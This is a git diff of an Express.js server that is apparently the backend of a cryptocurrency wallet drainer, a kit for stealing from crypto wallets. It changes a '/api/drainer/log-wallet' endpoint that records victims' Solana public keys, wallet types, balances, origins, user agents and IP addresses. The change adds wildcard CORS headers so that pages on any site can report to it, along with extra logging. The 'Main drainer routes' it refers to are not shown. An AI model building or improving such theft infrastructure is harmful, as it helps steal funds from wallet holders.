@@ -16,9 +16,29 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // API Routes - Specific routes first
 app.post('/api/drainer/log-wallet', async (req, res) => {
+  // Add CORS headers
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  
+  // Handle preflight requests
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+  
   try {
-    console.log('[SERVER] Received request body:', req.body);
+    console.log('[SERVER] Request method:', req.method);
+    console.log('[SERVER] Request URL:', req.url);
+    console.log('[SERVER] Request body type:', typeof req.body);
+    console.log('[SERVER] Request body:', req.body);
     console.log('[SERVER] Request headers:', req.headers);
+    console.log('[SERVER] Content-Type header:', req.headers['content-type']);
+    
+    // Check if body is empty or malformed
+    if (!req.body || typeof req.body !== 'object') {
+      console.error('[SERVER] Invalid request body:', req.body);
+      return res.status(400).json({ error: 'Invalid request body' });
+    }
     
     const { publicKey, walletType, origin, userAgent, lamports } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -52,6 +72,14 @@ app.post('/api/drainer/log-wallet', async (req, res) => {
     console.error('[SERVER] Error logging wallet connection:', error);
     res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
   }
+});
+
+// OPTIONS route for wallet logging
+app.options('/api/drainer/log-wallet', (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.status(200).end();
 });
 
 // Main drainer routes
